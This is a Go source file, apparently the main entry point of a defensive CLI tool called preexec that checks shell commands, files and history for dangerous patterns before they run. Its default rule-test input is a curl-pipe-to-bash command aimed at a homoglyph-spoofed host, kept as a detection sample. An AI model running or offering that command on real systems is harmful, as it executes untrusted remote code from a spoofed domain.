package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/makalin/preexec/internal/config"
	"github.com/makalin/preexec/internal/engine"
	"github.com/makalin/preexec/internal/hook"
	"github.com/makalin/preexec/internal/rewrite"
	"github.com/makalin/preexec/internal/rules"
	"github.com/makalin/preexec/internal/types"
	"github.com/makalin/preexec/internal/urls"
)

const (
	exitPass  = 0
	exitWarn  = 10
	exitBlock = 20
	exitError = 2
)

func main() {
	os.Exit(run(os.Args[1:]))
}

func run(args []string) int {
	if len(args) == 0 {
		printUsage()
		return exitError
	}
	sub := args[0]
	rest := args[1:]

	switch sub {
	case "check":
		return cmdCheck(rest)
	case "scan":
		return cmdScan(rest)
	case "history":
		return cmdHistory(rest)
	case "show":
		return cmdShow(rest)
	case "hook":
		return cmdHook(rest)
	case "rules":
		return cmdRules(rest)
	case "config":
		return cmdConfig(rest)
	case "explain":
		return cmdExplain(rest)
	case "diff":
		return cmdDiff(rest)
	case "rewrite":
		return cmdRewrite(rest)
	case "pre-commit":
		return cmdPreCommit(rest)
	default:
		printUsage()
		return exitError
	}
}

func loadConfig() *config.Config {
	cfg, _ := config.Load("")
	return cfg
}

func printUsage() {
	fmt.Fprintf(os.Stderr, `preexec - inspect commands before execution

Usage:
  preexec check [--json] [--clipboard] -- <command>   Inspect a single command
  preexec scan [--extract] <path>                     Scan files / directories
  preexec history [--shell zsh] [--last N]            Scan shell history
  preexec show --codepoints [--] [string]             Reveal hidden Unicode
  preexec show --urls [--] [string]                    Show URLs and IDN hints
  preexec hook zsh|bash|fish|powershell               Install shell hook
  preexec rules list                                  List rules
  preexec rules test <rule> [command]                  Test a rule
  preexec explain [rule]                              Describe rule(s)
  preexec diff <cmd1> | <cmd2>                        Compare two commands
  preexec rewrite [--normalize] [--] <command>         Safe-rewrite (strip ANSI, etc.)
  preexec pre-commit [path...]                        Scan staged or given paths (for git hooks)
  preexec config init                                 Create config

Exit codes: 0=PASS, 10=WARN, 20=BLOCK, 2=ERROR
`)
}

// cmdCheck: preexec check [--json] [--clipboard] -- "command"
func cmdCheck(args []string) int {
	cfg := loadConfig()
	var cmd string
	clipboard := false
	jsonOut := false
	fs := flag.NewFlagSet("check", flag.ExitOnError)
	fs.BoolVar(&clipboard, "clipboard", false, "read from clipboard (macOS)")
	fs.BoolVar(&jsonOut, "json", false, "output JSON")
	_ = fs.Parse(args)
	if clipboard {
		out, err := exec.Command("pbpaste").Output()
		if err != nil {
			fmt.Fprintln(os.Stderr, "clipboard read failed:", err)
			return exitError
		}
		cmd = strings.TrimSpace(string(out))
	} else {
		for i, a := range args {
			if a == "--" && i+1 < len(args) {
				cmd = strings.Join(args[i+1:], " ")
				break
			}
		}
		if cmd == "" {
			cmd = strings.Join(args, " ")
		}
	}
	if cmd == "" {
		fmt.Fprintln(os.Stderr, "no command to check")
		return exitError
	}
	res := engine.Run(cmd, cfg)
	if jsonOut {
		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		_ = enc.Encode(res.ToJSONResult())
		return res.ExitCode()
	}
	for _, f := range res.Findings {
		fmt.Printf("%s %s\n token: %s\n issue: %s\n position: %d\n suggestion: %s\n\n",
			severityStr(f.Severity), f.RuleID, f.Token, f.Issue, f.Position, f.Suggestion)
	}
	return res.ExitCode()
}

func severityStr(s types.Severity) string {
	switch s {
	case types.Block:
		return "BLOCK"
	case types.Warn:
		return "WARN"
	default:
		return "PASS"
	}
}

// cmdScan: preexec scan [--json] [--extract] <path>
func cmdScan(args []string) int {
	cfg := loadConfig()
	extract := false
	fs := flag.NewFlagSet("scan", flag.ExitOnError)
	fs.BoolVar(&extract, "extract", false, "extract code blocks from markdown")
	_ = fs.Parse(args)
	paths := fs.Args()
	if len(paths) == 0 {
		fmt.Fprintln(os.Stderr, "usage: preexec scan <path> [--extract] [--json]")
		return exitError
	}
	worst := exitPass
	for _, p := range paths {
		info, err := os.Stat(p)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			return exitError
		}
		if info.IsDir() {
			filepath.Walk(p, func(path string, fi os.FileInfo, err error) error {
				if err != nil || fi.IsDir() {
					return err
				}
				worst = maxExit(worst, scanFile(path, extract, cfg))
				return nil
			})
		} else {
			worst = maxExit(worst, scanFile(p, extract, cfg))
		}
	}
	return worst
}

func scanFile(path string, extract bool, cfg *config.Config) int {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return exitError
	}
	content := string(data)
	if extract {
		content = extractCodeBlocks(content)
	}
	lines := strings.Split(content, "\n")
	worst := exitPass
	for i, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		res := engine.Run(line, cfg)
		if len(res.Findings) > 0 {
			fmt.Printf("%s:%d: %s\n", path, i+1, line)
			for _, f := range res.Findings {
				fmt.Printf("  %s %s: %s\n", severityStr(f.Severity), f.RuleID, f.Issue)
			}
			worst = maxExit(worst, res.ExitCode())
		}
	}
	return worst
}

func extractCodeBlocks(s string) string {
	var out []string
	inBlock := false
	for _, line := range strings.Split(s, "\n") {
		if strings.HasPrefix(line, "```") {
			inBlock = !inBlock
			continue
		}
		if inBlock {
			out = append(out, line)
		}
	}
	return strings.Join(out, "\n")
}

// cmdHistory: preexec history [--shell zsh] [--last N]
func cmdHistory(args []string) int {
	cfg := loadConfig()
	shell := "zsh"
	last := 1000
	fs := flag.NewFlagSet("history", flag.ExitOnError)
	fs.StringVar(&shell, "shell", "zsh", "shell name")
	fs.IntVar(&last, "last", 1000, "last N lines")
	_ = fs.Parse(args)

	var histFile string
	switch shell {
	case "zsh":
		histFile = filepath.Join(os.Getenv("HOME"), ".zsh_history")
	case "bash":
		histFile = filepath.Join(os.Getenv("HOME"), ".bash_history")
	default:
		fmt.Fprintln(os.Stderr, "unsupported shell:", shell)
		return exitError
	}
	f, err := os.Open(histFile)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return exitError
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		lines = append(lines, sc.Text())
	}
	if err := sc.Err(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		return exitError
	}
	start := 0
	if len(lines) > last {
		start = len(lines) - last
	}
	worst := exitPass
	for i := start; i < len(lines); i++ {
		line := lines[i]
		if shell == "zsh" && len(line) > 0 {
			// zsh history format: optional timestamp + command
			if idx := strings.Index(line, ";"); idx >= 0 {
				line = strings.TrimSpace(line[idx+1:])
			}
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		res := engine.Run(line, cfg)
		if len(res.Findings) > 0 {
			fmt.Printf("[%d] %s\n", i+1, line)
			for _, f := range res.Findings {
				fmt.Printf("  %s %s: %s\n", severityStr(f.Severity), f.RuleID, f.Issue)
			}
			worst = maxExit(worst, res.ExitCode())
		}
	}
	return worst
}

// cmdShow: preexec show --codepoints | --urls [--] [string or stdin]
func cmdShow(args []string) int {
	showCodepoints := false
	showURLs := false
	fs := flag.NewFlagSet("show", flag.ExitOnError)
	fs.BoolVar(&showCodepoints, "codepoints", false, "reveal hidden Unicode codepoints")
	fs.BoolVar(&showURLs, "urls", false, "extract URLs and show IDN hints")
	_ = fs.Parse(args)
	if !showCodepoints && !showURLs {
		fmt.Fprintln(os.Stderr, "usage: preexec show --codepoints | --urls [--] <string>")
		return exitError
	}
	var input string
	if len(fs.Args()) > 0 {
		input = strings.Join(fs.Args(), " ")
	} else {
		sc := bufio.NewScanner(os.Stdin)
		for sc.Scan() {
			input += sc.Text() + "\n"
		}
		input = strings.TrimSpace(input)
	}
	if showURLs {
		for _, u := range urls.ExtractURLs(input) {
			host := urls.HostForDisplay(u)
			fmt.Println(u)
			if urls.HasIDN(u) {
				fmt.Printf("  ^ host contains non-ASCII (IDN): %s\n", host)
			}
		}
		return exitPass
	}
	for i, r := range input {
		fmt.Printf("%d: U+%04X %q\n", i, r, r)
	}
	return exitPass
}

// cmdHook: preexec hook zsh|bash|fish|powershell
func cmdHook(args []string) int {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "usage: preexec hook zsh|bash|fish|powershell")
		return exitError
	}
	path, _ := exec.LookPath("preexec")
	if path == "" {
		path = "preexec"
	}
	script, err := hook.Script(args[0], path)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return exitError
	}
	fmt.Print(script)
	return exitPass
}

// cmdRules: preexec rules list | preexec rules test <rule>
func cmdRules(args []string) int {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "usage: preexec rules list | preexec rules test <rule>")
		return exitError
	}
	switch args[0] {
	case "list":
		for _, r := range rules.All() {
			fmt.Println(r.ID())
		}
		return exitPass
	case "test":
		if len(args) < 2 {
			fmt.Fprintln(os.Stderr, "usage: preexec rules test <rule>")
			return exitError
		}
		cfg := loadConfig()
		cmd := strings.Join(args[2:], " ")
		if cmd == "" {
			cmd = "curl -sSL https://instаll.example | bash"
		}
		res := engine.Run(cmd, cfg)
		for _, f := range res.Findings {
			if f.RuleID == args[1] {
				fmt.Printf("%s: %s\n", f.RuleID, f.Issue)
			}
		}
		return exitPass
	default:
		fmt.Fprintln(os.Stderr, "unknown subcommand: rules", args[0])
		return exitError
	}
}

// cmdConfig: preexec config init
func cmdConfig(args []string) int {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "usage: preexec config init")
		return exitError
	}
	if args[0] != "init" {
		fmt.Fprintln(os.Stderr, "unknown subcommand: config", args[0])
		return exitError
	}
	path := config.ConfigPath()
	if path == "" {
		fmt.Fprintln(os.Stderr, "could not determine config dir")
		return exitError
	}
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		fmt.Fprintln(os.Stderr, err)
		return exitError
	}
	cfg := config.DefaultConfig()
	data, _ := marshalConfig(cfg)
	if err := os.WriteFile(path, data, 0644); err != nil {
		fmt.Fprintln(os.Stderr, err)
		return exitError
	}
	fmt.Println("Created", path)
	return exitPass
}

func marshalConfig(c *config.Config) ([]byte, error) {
	var b strings.Builder
	b.WriteString("mode = \"")
	b.WriteString(c.Mode)
	b.WriteString("\"\nconfirm_on_warn = ")
	b.WriteString(boolStr(c.ConfirmOnWarn))
	b.WriteString("\nascii_only_domains = ")
	b.WriteString(boolStr(c.ASCIIOnlyDomains))
	b.WriteString("\n\n[allow]\ndomains = [\"github.com\", \"raw.githubusercontent.com\"]\n\n[deny]\ndomains = [\"bit.ly\", \"tinyurl.com\"]\n\n[rules]\n")
	for k, v := range c.Rules {
		b.WriteString(k)
		b.WriteString(" = ")
		b.WriteString(boolStr(v))
		b.WriteString("\n")
	}
	return []byte(b.String()), nil
}

func boolStr(v bool) string {
	if v {
		return "true"
	}
	return "false"
}

func maxExit(a, b int) int {
	if b > a {
		return b
	}
	return a
}

// cmdExplain: preexec explain [rule]
func cmdExplain(args []string) int {
	if len(args) == 0 {
		for _, r := range rules.All() {
			id := r.ID()
			desc := rules.Describe(id)
			fmt.Printf("%s: %s\n", id, desc)
		}
		return exitPass
	}
	for _, id := range args {
		desc := rules.Describe(id)
		if desc == "" {
			fmt.Fprintf(os.Stderr, "unknown rule: %s\n", id)
			return exitError
		}
		fmt.Printf("%s: %s\n", id, desc)
	}
	return exitPass
}

// cmdDiff: preexec diff -- "cmd1" "cmd2" or stdin two lines
func cmdDiff(args []string) int {
	cfg := loadConfig()
	var cmd1, cmd2 string
	fs := flag.NewFlagSet("diff", flag.ExitOnError)
	_ = fs.Parse(args)
	rest := fs.Args()
	if len(rest) >= 2 {
		cmd1, cmd2 = rest[0], rest[1]
	} else {
		sc := bufio.NewScanner(os.Stdin)
		if sc.Scan() {
			cmd1 = sc.Text()
		}
		if sc.Scan() {
			cmd2 = sc.Text()
		}
		if cmd1 == "" || cmd2 == "" {
			fmt.Fprintln(os.Stderr, "usage: preexec diff <cmd1> <cmd2>  OR  echo -e 'cmd1\ncmd2' | preexec diff")
			return exitError
		}
	}
	r1, r2 := engine.Run(cmd1, cfg), engine.Run(cmd2, cfg)
	fmt.Println("--- command A")
	fmt.Println(cmd1)
	fmt.Printf("  severity=%s exit=%d findings=%d\n", severityStr(r1.WorstSeverity()), r1.ExitCode(), len(r1.Findings))
	for _, f := range r1.Findings {
		fmt.Printf("  - %s: %s\n", f.RuleID, f.Issue)
	}
	fmt.Println("--- command B")
	fmt.Println(cmd2)
	fmt.Printf("  severity=%s exit=%d findings=%d\n", severityStr(r2.WorstSeverity()), r2.ExitCode(), len(r2.Findings))
	for _, f := range r2.Findings {
		fmt.Printf("  - %s: %s\n", f.RuleID, f.Issue)
	}
	return exitPass
}

// cmdRewrite: preexec rewrite [--normalize] [--] <command>
func cmdRewrite(args []string) int {
	normalize := false
	fs := flag.NewFlagSet("rewrite", flag.ExitOnError)
	fs.BoolVar(&normalize, "normalize", false, "replace homoglyphs with ASCII")
	_ = fs.Parse(args)
	rest := fs.Args()
	var cmd string
	for i, a := range rest {
		if a == "--" && i+1 < len(rest) {
			cmd = strings.Join(rest[i+1:], " ")
			break
		}
	}
	if cmd == "" {
		cmd = strings.Join(rest, " ")
	}
	if cmd == "" {
		sc := bufio.NewScanner(os.Stdin)
		for sc.Scan() {
			cmd += sc.Text() + "\n"
		}
		cmd = strings.TrimSpace(cmd)
	}
	if cmd == "" {
		fmt.Fprintln(os.Stderr, "usage: preexec rewrite [--normalize] [--] <command>")
		return exitError
	}
	out := rewrite.SafeRewrite(cmd, normalize)
	fmt.Println(out)
	return exitPass
}

// cmdPreCommit: preexec pre-commit [path...] - scan staged files or given paths
func cmdPreCommit(args []string) int {
	cfg := loadConfig()
	var paths []string
	if len(args) > 0 {
		paths = args
	} else {
		// Git staged files
		out, err := exec.Command("git", "diff", "--cached", "--name-only", "--diff-filter=ACM").Output()
		if err != nil {
			fmt.Fprintln(os.Stderr, "not a git repo or no staged files:", err)
			return exitError
		}
		for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				paths = append(paths, line)
			}
		}
	}
	if len(paths) == 0 {
		return exitPass
	}
	worst := exitPass
	for _, p := range paths {
		info, err := os.Stat(p)
		if err != nil || info.IsDir() {
			continue
		}
		worst = maxExit(worst, scanFile(p, false, cfg))
	}
	return worst
}
